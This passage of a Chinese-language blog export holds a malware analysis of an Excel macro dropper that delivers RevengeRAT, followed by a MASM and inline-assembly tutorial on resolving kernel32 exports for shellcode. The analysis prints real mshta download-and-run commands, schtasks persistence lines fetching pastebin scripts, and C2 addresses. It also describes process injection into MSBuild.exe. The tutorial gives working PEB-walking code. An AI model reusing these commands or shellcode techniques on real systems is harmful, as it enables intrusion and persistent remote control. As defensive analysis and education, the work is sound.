rel=\"noopener\">http://www.pastebin.com/raw/nv5d9pYu</a></td>\n<td>C&amp;C</td>\n</tr>\n<tr>\n<td><a href=\"http://pastebin.com/raw/vXpe74L2\" target=\"_blank\" rel=\"noopener\">http://pastebin.com/raw/vXpe74L2</a></td>\n<td>C&amp;C</td>\n</tr>\n<tr>\n<td><a href=\"http://pastebin.com/raw/JdTuFmc5\" target=\"_blank\" rel=\"noopener\">http://pastebin.com/raw/JdTuFmc5</a></td>\n<td>C&amp;C</td>\n</tr>\n<tr>\n<td><a href=\"http://pastebin.com/raw/CGe3S2Vf\" target=\"_blank\" rel=\"noopener\">http://pastebin.com/raw/CGe3S2Vf</a></td>\n<td>C&amp;C</td>\n</tr>\n<tr>\n<td><a href=\"https://pastebin.com/raw/wMG90xwi\" target=\"_blank\" rel=\"noopener\">https://pastebin.com/raw/wMG90xwi</a></td>\n<td>C&amp;C</td>\n</tr>\n<tr>\n<td><a href=\"https://pastebin.com/raw/W455MkAZ\" target=\"_blank\" rel=\"noopener\">https://pastebin.com/raw/W455MkAZ</a></td>\n<td>C&amp;C</td>\n</tr>\n<tr>\n<td>meandmyjoggar.duckdns.org:777</td>\n<td>C&amp;C</td>\n</tr>\n</tbody></table>\n<h2 id=\"查杀方案\"><a href=\"#查杀方案\" class=\"headerlink\" title=\"查杀方案\"></a>查杀方案</h2><p>关闭<code>MSBuild.exe</code>进程<br>删除计划任务名为<code>Windows Update</code>和<code>Update</code>的任务<br>删除<code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AvastUpdate</code>表项<br>删除<code>Order____679873892.xls</code></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>感染链复杂，控制解密繁琐，多方面控制持久化操作，无文件攻击，技术含量高。个人以及企业中需要时刻面对各种威胁，要时刻保持警惕，防患于未然。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"基本信息\"><a href=\"#基本信息\" class=\"headerlink\" title=\"基本信息\"></a>基本信息</h2><table>\n<thead>\n<tr>\n<th>FileName</th>\n<th>FileType</th>\n<th>MD5</th>\n<th>Size</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Order____679873892.xls</td>\n<td>rat</td>\n<td>7641FEF8ABC7CB24B66655D11EF3DAF2</td>\n<td>41472 bytes</td>\n</tr>\n</tbody></table>\n<h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>该样本语言类型为 VBS和JS编写，中间过程完全使用无文件格式，内容也都能随时在线更改，在一定程序上能躲避安全软件的查杀，通过不同混淆更容易达到免杀的效果。</p>\n<h2 id=\"流程图\"><a href=\"#流程图\" class=\"headerlink\" title=\"流程图\"></a>流程图</h2><p><img src=\"https://img-blog.csdnimg.cn/20190920124614242.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"详细分析\"><a href=\"#详细分析\" class=\"headerlink\" title=\"详细分析\"></a>详细分析</h2><p>文件有宏，且宏有密码，可以使用<code>offkey</code>直接更改宏密码<br>进入宏代码后在<code>shell(fun)</code>处下断，可以拿到shell 的连接地址<br><img src=\"https://img-blog.csdnimg.cn/20190916212336956.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"> <code>mshta http://bit.ly/8hsshjahassahsh</code></p>\n<p>打开这个页面看似是一个正常页面，但仔细查找是能在源码中找到恶意js代码的<br><img src=\"https://img-blog.csdnimg.cn/20190917141638561.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>拿出来使用<code>console</code>打印出来<br><img src=\"https://img-blog.csdnimg.cn/20190917141856253.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20190917143320931.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>处理后执行了<code>WScript.Shell.Run mshta http://www.pastebin.com/raw/nv5d9pYu,vbHide</code><br>看看究竟是什么东西<br>木马作者选择了一个匿名代码存放地址网站，来逃避追踪。<br>但是目前这个RWA地址页面已经被删除了<br><img src=\"https://img-blog.csdnimg.cn/20190917143741625.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>这个样本在any.run上有人运行过，有记录，所以可以找到这个访问记录。<br><a href=\"https://app.any.run/tasks/0100486e-1711-4af6-a437-74ad27216f36/\" target=\"_blank\" rel=\"noopener\">https://app.any.run/tasks/0100486e-1711-4af6-a437-74ad27216f36/</a><br><img src=\"https://img-blog.csdnimg.cn/20190917144032656.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>拿出这个代码<br><img src=\"https://img-blog.csdnimg.cn/20190917144558325.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>下面看看怎么玩的，关闭打开的excel word ppt msp软件，让中马的人以为想不到是宏的原因，给人 眼部见为净 的感觉</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190917151722331.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p>接着又安装两个计划任务，来持久化攻击和进一步执行操作</p>\n<p><code>schtasks /create /sc MINUTE /mo 60 /tn Windows Update /tr mshta.exe http://pastebin.com/raw/vXpe74L2 /F</code><img src=\"https://img-blog.csdnimg.cn/20190917154541622.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><code>schtasks /create /sc MINUTE /mo 300 /tn Update /tr mshta.exe http://pastebin.com/raw/JdTuFmc5 /F</code><br><img src=\"https://img-blog.csdnimg.cn/20190917154555627.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>通过schtasks  创建两个计划任务来执行两个脚本文件<br>还加入了一个开启自启动<br><img src=\"https://img-blog.csdnimg.cn/2019091715561730.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p>接下来看看这三个脚本是怎么操作的</p>\n<p><code>JdTuFmc5</code> 又是一系列加密，下面是解密后的结果</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190919105945345.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>尝试去下载并执行两个.net编写的可执行程序，暂时命名为<code>bit1.bin</code>和<code>2bit1.bin</code>后面分析</p>\n<p>在<code>wMG90xwi</code>这个raw中定义了一个<code>$a</code>对象，这个对象是将上面的bit1.bin读入内存的对象，可以直接使用<br><img src=\"https://img-blog.csdnimg.cn/20190919105430408.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>使用dnspy打开反编译这个dll</p>\n<p>里面就有<code>THC452563sdfdsdfgr4777cxg04477fsdf810df777</code>类和它的方法<code>retrt477fdg145fd4g0wewerwedsa799221dsad4154qwe(string FTONJ, byte[] coco)</code> </p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190919110436546.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>然后使用<code>Invoke</code>去调用了这个方法，且传入的参数是(‘MSBuild.exe’,$f)</p>\n<p>查一下壳，发现是加了<code>Confuser</code>的混淆</p>\n<p>解完混淆之后再看<br><img src=\"https://img-blog.csdnimg.cn/20190920183121543.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>会按照顺序去检测文件<code>MSBuild.exe</code>存在在哪，然后调用<code>ticklens</code><br><img src=\"https://img-blog.csdnimg.cn/20190920183342286.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><code>PEHeaderE</code>函数是在修改程序自身代码<br><img src=\"https://img-blog.csdnimg.cn/20190920184816602.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\">主要看<code>FUN</code><br><img src=\"https://img-blog.csdnimg.cn/20190920184846835.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>发现是在循环调用<code>smethod_0</code>方法，这个方法就是真正的创建傀儡进程</p>\n<p><code>lpname</code> 指向要打开的进程</p>\n<p><code>lpBuf</code> 是要注入的数据</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20190920185315420.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/2019092018553021.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20190920185552483.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20190920185722874.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20190920185657512.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20190920185749272.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>上面就是典型的进程注入  作用是将第二个可执行程序注入到<code>MSBuild.exe</code>中</p>\n<p>这里就直接看一下 这个注入的程序到底是什么</p>\n<p>反编译下一个2bit2.bin</p>\n<p>根据关键字搜索，可以发现这是<code>RevengeRAT</code>远控生成的客户端<br><img src=\"https://img-blog.csdnimg.cn/20190920111854823.png\" srcset=\"/cray/img/loading.gif\" alt=\"在这里插入图片描述\"><br>这个远控是一个有免费版本，网络上也有泄露的版本，因为是.net编写，基本功能也都能识别出来</p>\n<p>首先是C2地址 <code>meandmyjoggar.duckdns.org:777</code></p>\n<p>程序互斥体名 <code>RV_MUTEX-WindowsUpdateSysten32</code></p>\n<p>两个计划任务和加入的启动项注册表都是一样的程序，这里就不累述了</p>\n<p><strong>总的来说就是将远控代码注入到一个正常的程序中，来达到执行且躲避安全软件</strong></p>\n<h2 id=\"IOC\"><a href=\"#IOC\" class=\"headerlink\" title=\"IOC\"></a>IOC</h2><table>\n<thead>\n<tr>\n<th>域名</th>\n<th>类型</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a href=\"http://www.pastebin.com/raw/nv5d9pYu\" target=\"_blank\" rel=\"noopener\">http://www.pastebin.com/raw/nv5d9pYu</a></td>\n<td>C&amp;C</td>\n</tr>\n<tr>\n<td><a href=\"http://pastebin.com/raw/vXpe74L2\" target=\"_blank\" rel=\"noopener\">http://pastebin.com/raw/vXpe74L2</a></td>\n<td>C&amp;C</td>\n</tr>\n<tr>\n<td><a href=\"http://pastebin.com/raw/JdTuFmc5\" target=\"_blank\" rel=\"noopener\">http://pastebin.com/raw/JdTuFmc5</a></td>\n<td>C&amp;C</td>\n</tr>\n<tr>\n<td><a href=\"http://pastebin.com/raw/CGe3S2Vf\" target=\"_blank\" rel=\"noopener\">http://pastebin.com/raw/CGe3S2Vf</a></td>\n<td>C&amp;C</td>\n</tr>\n<tr>\n<td><a href=\"https://pastebin.com/raw/wMG90xwi\" target=\"_blank\" rel=\"noopener\">https://pastebin.com/raw/wMG90xwi</a></td>\n<td>C&amp;C</td>\n</tr>\n<tr>\n<td><a href=\"https://pastebin.com/raw/W455MkAZ\" target=\"_blank\" rel=\"noopener\">https://pastebin.com/raw/W455MkAZ</a></td>\n<td>C&amp;C</td>\n</tr>\n<tr>\n<td>meandmyjoggar.duckdns.org:777</td>\n<td>C&amp;C</td>\n</tr>\n</tbody></table>\n<h2 id=\"查杀方案\"><a href=\"#查杀方案\" class=\"headerlink\" title=\"查杀方案\"></a>查杀方案</h2><p>关闭<code>MSBuild.exe</code>进程<br>删除计划任务名为<code>Windows Update</code>和<code>Update</code>的任务<br>删除<code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AvastUpdate</code>表项<br>删除<code>Order____679873892.xls</code></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>感染链复杂，控制解密繁琐，多方面控制持久化操作，无文件攻击，技术含量高。个人以及企业中需要时刻面对各种威胁，要时刻保持警惕，防患于未然。</p>\n"},{"title":"MASH和内联MASH","date":"2019-08-22T11:11:22.000Z","index_img":"https://w.wallhaven.cc/full/2k/wallhaven-2kmoxm.jpg","banner_img":"https://w.wallhaven.cc/full/2k/wallhaven-2kmoxm.jpg","_content":"\n\n开始前一定先了解下汇编的种类`https://blog.csdn.net/ye1223/article/details/79060434`\n\n我这里只简述我学习的**MASH汇编**和**内联的MASH格式**的汇编\n\n### mash 汇编如下\n下面程序的目的是遍历Kernel32模块的导出函数和基值，在shellcode中可以用到\n\n\n```mash\n.386\n.model flat,stdcall\noption casemap:none\n\n; 包含printf函数所在的头文件和库文件\ninclude msvcrt.inc ; 微软vc运行时库的头文件,\n\t\t   ; 一般包含的时c语言的各个头文件\nincludelib msvcrt.lib ; 包含头文件所对应的库文件\n\nassume fs:nothing\n\n.const ; 全局常量\ng_formtStr db \"%-40s      \",0\ng_formtInt db \"%d \",0ah,0\ng_formtHex db \"%08X \",0ah,0\n\n.code\n\n\nGetA proc\n\tLOCAL @addOfFunc;\n\tLOCAL @AddOfName;\n\tLOCAL @AddOfNaOrd;\n\tLOCAL @Sum;\n\n\tmov eax,fs:[48];fs表示当前线程的teb结构，eax为PEB的地址\n\tmov eax,[eax+12];获取这个进程的导入dll\n\tmov eax,[eax+28];获取PEB_LDR_DATA结构v \n\tmov eax,[eax];获取第一个结构的值\n\tmov eax,[eax];获取第一个结构的值\n\t\n\t\n\t\n\tmov ebx,[eax+8h];ebx=dll基质\n\tmov eax,[ebx+3ch]\n\tmov eax,[eax+ebx+78h]\n\tadd eax,ebx\n\t\n\tmov ecx,[eax+14h];//Sumfunc\n\tmov edx,[eax+1ch];//AddressOfFunctions\n\tmov esi,[eax+20h];//AddressOfNames\n\tmov edi,[eax+24h];//AddressOfNameOrdinals\n\tadd edx,ebx;\n\tadd esi,ebx;\n\tadd edi,ebx;//edi 已经是第一个符号的地址（2字节）\n\tmov @addOfFunc,edx;\n\tmov @AddOfName,esi;\n\tmov @AddOfNaOrd,edi;\n\t;mov ecx,10;\n\tmov @Sum,ecx;\n\t\n\txor ecx,ecx;清空计数器\n\t\nLL1:\n\t\n\t\n\tpush ecx;因为printf会影响ecx,eax,edx的值，所以只要把这个push到栈中临时保存\n\t\n\tmov eax,[esi+ecx*4];esi指向的是AddressOfNames的RVA表地址，每一个RVA都是一个DWORD 所以要*4\n\tadd eax,ebx;ebx是这个dll的基值\n\t\n \tpush eax ; offset 伪指令能够取到一个标识符的地址\n\tpush offset g_formtStr;输出格式\n\tcall crt__cprintf ; 调用函数\n\tadd esp,8;//打印Func名字 \n\t\n\tpop ecx;把偏移pop出来使用\n\t\n\tmov eax,@AddOfNaOrd;取符号表的基值\n\tadd eax,ecx;\n\tadd eax,ecx;这里的两个add是因为每个符号表只占一个WORD，（等于eax+ecx*2)\n\tmov eax,[eax];拿出这个偏移的符号值\n\tand eax,0FFFFh;应为eax是DWORD 而我们只要内存中的低四位，所以这样取\n\tpush ecx;还是因为prinf会破坏ecx的值\n\t\n \t;push eax ; offset 伪指令能够取到一个标识符的地址\n\t;push offset g_formtInt\n\t;call crt__cprintf ; 调用函数\n\t;add esp,8;//打印名字 \n\t\n\tmov edx,@addOfFunc;\n\tadd edx,eax;\n\tadd edx,eax;\n\tadd edx,eax;\n\tadd edx,eax;这里也和上面一样，相当于edx+eax*4,因为函数地址=BaseAddressOfFunctions+对应符号表值\n\tmov edx,[edx];取AddressOfFunctions指向的地址\n\tadd edx,ebx;这个地址是RVA要加上dll的BASE\n\t\n\t;call edx;\n\n\tpush edx ; offset 伪指令能够取到一个标识符的地址\n\tpush offset g_formtHex;a\n\tcall crt__cprintf ; 调用函数\n\tadd esp,8;//打印名字 \n\n\tpop ecx\n\tadd ecx ,1;\n\tcmp ecx,@Sum\n\tjne LL1\n\tret\nGetA endp\n\nmain:\n\tcall GetA;\n\tret \nend main\nend \n```\n\n### 内联汇编\n使用这种汇编可以提高我们生产效率,完全可以写成shellcode，任何函数都能自己实现，自己调用，不需要静态导入函数，全部动态自己调用导入函数的API\n\t\n内联函数的硬编码确实是个麻烦事，找到了如下的解决方案，在代码段写数据，然后跳过他\n\n```c\n#include \"windows.h\"\n\nFARPROC LoadLibA(char *szModlePath,char* funcName)\n{\n\t/*\n\t__IN szModlePath 要导入的dll地址\n\t__IN funcName 要查询这个dll里面的具体函数名\n\t__return 返回值是一个远call，保存的是这个funcName的地址\n\t*/\n\t__asm\n\t{\n\t\tmov eax,FS:[30h];\n\t\tmov eax,[eax+0Ch];\n\t\tmov eax,[eax+1Ch];//这个是第一个ldr_data结构指向第一个模块\n\t\tmov eax,[eax];//拿到第一个模块的门三地址  C:\\Windows\\system32\\KERNELBASE.dll\n\t\tmov eax,[eax]//kernel32.dll\n\t\tmov ebx,[eax+08h];//GetDllBase = ebx\n\n\t\t// \t\t现在进去dll内存操作\n\t\tmov eax,[ebx+3Ch];\n\t\tmov eax,[eax+ebx+78h];\n\t\tadd eax,ebx;\n\t\tmov edi,[eax+1Ch];\n\t\tadd edi,ebx;     //edx = AddressOfFunctions这张表的基值(已经指向第一个无名函数了)\n\t\t//查表，LoadLibraryW在kernel32中符号位为0x341    LoadLibraryA = 0x33e\n\t\t//mov esi,341H;\n\t\tmov esi,33EH; //LoadLibraryW\n\t\tsub esi,1h;//可以不用管\n\t\tmov eax,[edi+esi*4];\n\t\tadd eax,ebx;//LoadLibraryW的地址\n\t\tpush szModlePath\n\t\tcall eax\t//eax = 获取dll的起始地址\n\t\t\n\n\t\tmov esi,246h;//GetProcAddress\n\t\tsub esi,1;\n\t\tmov ecx,[edi+esi*4];\n\t\tadd ecx,ebx;\n\n\t\tjmp L1\nszFuncName: _EMIT 'A'\n\t\t\t_EMIT 'd'\n\t\t\t_EMIT 'd'\n\t\t\t_EMIT 0x00\n\t\t\t//硬编码字符串在代码段\nL1:\n\t\t//push offset szFuncName;\n\t\tpush funcName;\n\t\tpush eax;\n\t\tcall ecx;//获取到funcName的地址，返回到eax中\n\t\t//call eax;//执行这个func\n\t}  \n\t //函数返回都是eax方式返回\n}\n\nint main()\n{\n\tFARPROC Addr =LoadLibA(\"user32.dll\",\"MessageBoxA\");\n\n\t__asm\n\t{\n\t\tpush 0;\n\t\tpush 0;\n\t\tpush 0;\n\t\tpush 0;\n\t\tcall eax;\n\t}\n\treturn 0;\n}\n\n\n```\n","source":"_posts/MASH和内联MASH.md","raw":"---\ntitle: MASH和内联MASH\ndate: 2019-08-22 19:11:22\n\nindex_img: https://w.wallhaven.cc/full/2k/wallhaven-2kmoxm.jpg\nbanner_img: https://w.wallhaven.cc/full/2k/wallhaven-2kmoxm.jpg\n\ntags:\n    - shellcode\n    - 内联汇编\n    - mash\ncategories: 编程\n---\n\n\n开始前一定先了解下汇编的种类`https://blog.csdn.net/ye1223/article/details/79060434`\n\n我这里只简述我学习的**MASH汇编**和**内联的MASH格式**的汇编\n\n### mash 汇编如下\n下面程序的目的是遍历Kernel32模块的导出函数和基值，在shellcode中可以用到\n\n\n```mash\n.386\n.model flat,stdcall\noption casemap:none\n\n; 包含printf函数所在的头文件和库文件\ninclude msvcrt.inc ; 微软vc运行时库的头文件,\n\t\t   ; 一般包含的时c语言的各个头文件\nincludelib msvcrt.lib ; 包含头文件所对应的库文件\n\nassume fs:nothing\n\n.const ; 全局常量\ng_formtStr db \"%-40s      \",0\ng_formtInt db \"%d \",0ah,0\ng_formtHex db \"%08X \",0ah,0\n\n.code\n\n\nGetA proc\n\tLOCAL @addOfFunc;\n\tLOCAL @AddOfName;\n\tLOCAL @AddOfNaOrd;\n\tLOCAL @Sum;\n\n\tmov eax,fs:[48];fs表示当前线程的teb结构，eax为PEB的地址\n\tmov eax,[eax+12];获取这个进程的导入dll\n\tmov eax,[eax+28];获取PEB_LDR_DATA结构v \n\tmov eax,[eax];获取第一个结构的值\n\tmov eax,[eax];获取第一个结构的值\n\t\n\t\n\t\n\tmov ebx,[eax+8h];ebx=dll基质\n\tmov eax,[ebx+3ch]\n\tmov eax,[eax+ebx+78h]\n\tadd eax,ebx\n\t\n\tmov ecx,[eax+14h];//Sumfunc\n\tmov edx,[eax+1ch];//AddressOfFunctions\n\tmov esi,[eax+20h];//AddressOfNames\n\tmov edi,[eax+24h];//AddressOfNameOrdinals\n\tadd edx,ebx;\n\tadd esi,ebx;\n\tadd edi,ebx;//edi 已经是第一个符号的地址（2字节）\n\tmov @addOfFunc,edx;\n\tmov @AddOfName,esi;\n\tmov @AddOfNaOrd,edi;\n\t;mov ecx,10;\n\tmov @Sum,ecx;\n\t\n\txor ecx,ecx;清空计数器\n\t\nLL1:\n\t\n\t\n\tpush ecx;因为printf会影响ecx,eax,edx的值，所以只要把这个push到栈中临时保存\n\t\n\tmov eax,[esi+ecx*4];esi指向的是AddressOfNames的RVA表地址，每一个RVA都是一个DWORD 所以要*4\n\tadd eax,ebx;ebx是这个dll的基值\n\t\n \tpush eax ; offset 伪指令能够取到一个标识符的地址\n\tpush offset g_formtStr;输出格式\n\tcall crt__cprintf ; 调用函数\n\tadd esp,8;//打印Func名字 \n\t\n\tpop ecx;把偏移pop出来使用\n\t\n\tmov eax,@AddOfNaOrd;取符号表的基值\n\tadd eax,ecx;\n\tadd eax,ecx;这里的两个add是因为每个符号表只占一个WORD，（等于eax+ecx*2)\n\tmov eax,[eax];拿出这个偏移的符号值\n\tand eax,0FFFFh;应为eax是DWORD 而我们只要内存中的低四位，所以这样取\n\tpush ecx;还是因为prinf会破坏ecx的值\n\t\n \t;push eax ; offset 伪指令能够取到一个标识符的地址\n\t;push offset g_formtInt\n\t;call crt__cprintf ; 调用函数\n\t;add esp,8;//打印名字 \n\t\n\tmov edx,@addOfFunc;\n\tadd edx,eax;\n\tadd edx,eax;\n\tadd edx,eax;\n\tadd edx,eax;这里也和上面一样，相当于edx+eax*4,因为函数地址=BaseAddressOfFunctions+对应符号表值\n\tmov edx,[edx];取AddressOfFunctions指向的地址\n\tadd edx,ebx;这个地址是RVA要加上dll的BASE\n\t\n\t;call edx;\n\n\tpush edx ; offset 伪指令能够取到一个标识符的地址\n\tpush offset g_formtHex;a\n\tcall crt__cprintf ; 调用函数\n\tadd esp,8;//打印名字 \n\n\tpop ecx\n\tadd ecx ,1;\n\tcmp ecx,@Sum\n\tjne LL1\n\tret\nGetA endp\n\nmain:\n\tcall GetA;\n\tret \nend main\nend \n```\n\n### 内联汇编\n使用这种汇编可以提高我们生产效率,完全可以写成shellcode，任何函数都能自己实现，自己调用，不需要静态导入函数，全部动态自己调用导入函数的API\n\t\n内联函数的硬编码确实是个麻烦事，找到了如下的解决方案，在代码段写数据，然后跳过他\n\n```c\n#include \"windows.h\"\n\nFARPROC LoadLibA(char *szModlePath,char* funcName)\n{\n\t/*\n\t__IN szModlePath 要导入的dll地址\n\t__IN funcName 要查询这个dll里面的具体函数名\n\t__return 返回值是一个远call，保存的是这个funcName的地址\n\t*/\n\t__asm\n\t{\n\t\tmov eax,FS:[30h];\n\t\tmov eax,[eax+0Ch];\n\t\tmov eax,[eax+1Ch];//这个是第一个ldr_data结构指向第一个模块\n\t\tmov eax,[eax];//拿到第一个模块的门三地址  C:\\Windows\\system32\\KERNELBASE.dll\n\t\tmov eax,[eax]//kernel32.dll\n\t\tmov ebx,[eax+08h];//GetDllBase = ebx\n\n\t\t// \t\t现在进去dll内存操作\n\t\tmov eax,[ebx+3Ch];\n\t\tmov eax,[eax+ebx+78h];\n\t\tadd eax,ebx;\n\t\tmov edi,[eax+1Ch];\n\t\tadd edi,ebx;     //edx = AddressOfFunctions这张表的基值(已经指向第一个无名函数了)\n\t\t//查表，LoadLibraryW在kernel32中符号位为0x341    LoadLibraryA = 0x33e\n\t\t//mov esi,341H;\n\t\tmov esi,33EH; //LoadLibraryW\n\t\tsub esi,1h;//可以不用管\n\t\tmov eax,[edi+esi*4];\n\t\tadd eax,ebx;//LoadLibraryW的地址\n\t\tpush szModlePath\n\t\tcall eax\t//eax = 获取dll的起始地址\n\t\t\n\n\t\tmov esi,246h;//GetProcAddress\n\t\tsub esi,1;\n\t\tmov ecx,[edi+esi*4];\n\t\tadd ecx,ebx;\n\n\t\tjmp L1\nszFuncName: _EMIT 'A'\n\t\t\t_EMIT 'd'\n\t\t\t_EMIT 'd'\n\t\t\t_EMIT 0x00\n\t\t\t//硬编码字符串在代码段\nL1:\n\t\t//push offset szFuncName;\n\t\tpush funcName;\n\t\tpush eax;\n\t\tcall ecx;//获取到funcName的地址，返回到eax中\n\t\t//call eax;//执行这个func\n\t}  \n\t //函数返回都是eax方式返回\n}\n\nint main()\n{\n\tFARPROC Addr =LoadLibA(\"user32.dll\",\"MessageBoxA\");\n\n\t__asm\n\t{\n\t\tpush 0;\n\t\tpush 0;\n\t\tpush 0;\n\t\tpush 0;\n\t\tcall eax;\n\t}\n\treturn 0;\n}\n\n\n```\n","slug":"MASH和内联MASH","published":1,"updated":"2020-03-17T13:38:28.238Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw628000qccuq08dli5k8","content":"<p>开始前一定先了解下汇编的种类<code>https://blog.csdn.net/ye1223/article/details/79060434</code></p>\n<p>我这里只简述我学习的<strong>MASH汇编</strong>和<strong>内联的MASH格式</strong>的汇编</p>\n<h3 id=\"mash-汇编如下\"><a href=\"#mash-汇编如下\" class=\"headerlink\" title=\"mash 汇编如下\"></a>mash 汇编如下</h3><p>下面程序的目的是遍历Kernel32模块的导出函数和基值，在shellcode中可以用到</p>\n<pre><code class=\"mash\">.386\n.model flat,stdcall\noption casemap:none\n\n; 包含printf函数所在的头文件和库文件\ninclude msvcrt.inc ; 微软vc运行时库的头文件,\n           ; 一般包含的时c语言的各个头文件\nincludelib msvcrt.lib ; 包含头文件所对应的库文件\n\nassume fs:nothing\n\n.const ; 全局常量\ng_formtStr db &quot;%-40s      &quot;,0\ng_formtInt db &quot;%d &quot;,0ah,0\ng_formtHex db &quot;%08X &quot;,0ah,0\n\n.code\n\n\nGetA proc\n    LOCAL @addOfFunc;\n    LOCAL @AddOfName;\n    LOCAL @AddOfNaOrd;\n    LOCAL @Sum;\n\n    mov eax,fs:[48];fs表示当前线程的teb结构，eax为PEB的地址\n    mov eax,[eax+12];获取这个进程的导入dll\n    mov eax,[eax+28];获取PEB_LDR_DATA结构v \n    mov eax,[eax];获取第一个结构的值\n    mov eax,[eax];获取第一个结构的值\n\n\n\n    mov ebx,[eax+8h];ebx=dll基质\n    mov eax,[ebx+3ch]\n    mov eax,[eax+ebx+78h]\n    add eax,ebx\n\n    mov ecx,[eax+14h];//Sumfunc\n    mov edx,[eax+1ch];//AddressOfFunctions\n    mov esi,[eax+20h];//AddressOfNames\n    mov edi,[eax+24h];//AddressOfNameOrdinals\n    add edx,ebx;\n    add esi,ebx;\n    add edi,ebx;//edi 已经是第一个符号的地址（2字节）\n    mov @addOfFunc,edx;\n    mov @AddOfName,esi;\n    mov @AddOfNaOrd,edi;\n    ;mov ecx,10;\n    mov @Sum,ecx;\n\n    xor ecx,ecx;清空计数器\n\nLL1:\n\n\n    push ecx;因为printf会影响ecx,eax,edx的值，所以只要把这个push到栈中临时保存\n\n    mov eax,[esi+ecx*4];esi指向的是AddressOfNames的RVA表地址，每一个RVA都是一个DWORD 所以要*4\n    add eax,ebx;ebx是这个dll的基值\n\n     push eax ; offset 伪指令能够取到一个标识符的地址\n    push offset g_formtStr;输出格式\n    call crt__cprintf ; 调用函数\n    add esp,8;//打印Func名字 \n\n    pop ecx;把偏移pop出来使用\n\n    mov eax,@AddOfNaOrd;取符号表的基值\n    add eax,ecx;\n    add eax,ecx;这里的两个add是因为每个符号表只占一个WORD，（等于eax+ecx*2)\n    mov eax,[eax];拿出这个偏移的符号值\n    and eax,0FFFFh;应为eax是DWORD 而我们只要内存中的低四位，所以这样取\n    push ecx;还是因为prinf会破坏ecx的值\n\n     ;push eax ; offset 伪指令能够取到一个标识符的地址\n    ;push offset g_formtInt\n    ;call crt__cprintf ; 调用函数\n    ;add esp,8;//打印名字 \n\n    mov edx,@addOfFunc;\n    add edx,eax;\n    add edx,eax;\n    add edx,eax;\n    add edx,eax;这里也和上面一样，相当于edx+eax*4,因为函数地址=BaseAddressOfFunctions+对应符号表值\n    mov edx,[edx];取AddressOfFunctions指向的地址\n    add edx,ebx;这个地址是RVA要加上dll的BASE\n\n    ;call edx;\n\n    push edx ; offset 伪指令能够取到一个标识符的地址\n    push offset g_formtHex;a\n    call crt__cprintf ; 调用函数\n    add esp,8;//打印名字 \n\n    pop ecx\n    add ecx ,1;\n    cmp ecx,@Sum\n    jne LL1\n    ret\nGetA endp\n\nmain:\n    call GetA;\n    ret \nend main\nend </code></pre>\n<h3 id=\"内联汇编\"><a href=\"#内联汇编\" class=\"headerlink\" title=\"内联汇编\"></a>内联汇编</h3><p>使用这种汇编可以提高我们生产效率,完全可以写成shellcode，任何函数都能自己实现，自己调用，不需要静态导入函数，全部动态自己调用导入函数的API</p>\n<p>内联函数的硬编码确实是个麻烦事，找到了如下的解决方案，在代码段写数据，然后跳过他</p>\n<pre><code class=\"c\">#include &quot;windows.h&quot;\n\nFARPROC LoadLibA(char *szModlePath,char* funcName)\n{\n    /*\n    __IN szModlePath 要导入的dll地址\n    __IN funcName 要查询这个dll里面的具体函数名\n    __return 返回值是一个远call，保存的是这个funcName的地址\n    */\n    __asm\n    {\n        mov eax,FS:[30h];\n        mov eax,[eax+0Ch];\n        mov eax,[eax+1Ch];//这个是第一个ldr_data结构指向第一个模块\n        mov eax,[eax];//拿到第一个模块的门三地址  C:\\Windows\\system32\\KERNELBASE.dll\n        mov eax,[eax]//kernel32.dll\n        mov ebx,[eax+08h];//GetDllBase = ebx\n\n        //         现在进去dll内存操作\n        mov eax,[ebx+3Ch];\n        mov 